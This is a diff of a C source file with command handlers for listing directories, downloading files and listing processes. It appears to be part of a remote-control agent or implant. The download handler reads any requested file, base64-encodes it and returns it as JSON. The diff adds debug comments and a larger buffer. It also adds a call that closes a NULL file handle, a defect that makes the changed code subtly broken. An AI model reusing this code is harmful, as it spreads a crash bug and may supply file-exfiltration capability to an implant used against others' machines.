@@ -58,28 +58,39 @@ char *command_ls(char *args, int argsLen, int *msgLen) {
 
 const char *fileBlank = "{\"file\": {\"name\": \"%s\", \"content\": \"%s\"}}";
 char *command_download(char *args, int argsLen, int *msgLen) {
+    //printf("try to download\n");
     FILE *file;
     char *buffer;
     long fileSize;
     file = fopen(args, "rb");
+    //printf("try to download check point 1\n");
     if(file == NULL) {
         buffer = (char *)malloc(MSGBLANK_LEN + 0x10 + NODIR_LEN);
         *msgLen = sprintf(buffer, jsonMsgBlank, noDir);
+        fclose(file);
         return buffer;
     }
+    //printf("try to download check point 2\n");
     fseek(file, 0,SEEK_END);
     fileSize = ftell(file);
     fseek(file, 0, SEEK_SET);
 
     buffer = (char *)malloc(fileSize);
+    //printf("try to download check point 3\n");
     fread(buffer, 1, fileSize, file);
     fclose(file);
     int base64Len;
+    //printf("try to download check point 4\n");
     char *base64 = base64_encode((const unsigned char *)buffer, fileSize, &base64Len);
+    //printf("try to download check point 5\n");
+    
     free(buffer);
-    buffer = (char *)malloc(base64Len + argsLen + 0x40);
+    buffer = (char *)malloc(base64Len + argsLen + 0x200);
+    //printf("try to download check point 6\n");
     *msgLen = sprintf(buffer, fileBlank, args, base64);
+    //printf("try to download check point 7\n");
     free(base64);
+    //printf("try to download check point 8\n");
     return buffer;
 }
 
@@ -286,3 +297,9 @@ char *command_process(char *args, int argsLen, int *msgLen) {
     free(processData);
     return buf;
 }
+/*
+int main() {
+    int len;
+    char *file = command_download((char *)"./blank.exe", 11, &len);
+    printf("%d\n", len);
+}*/
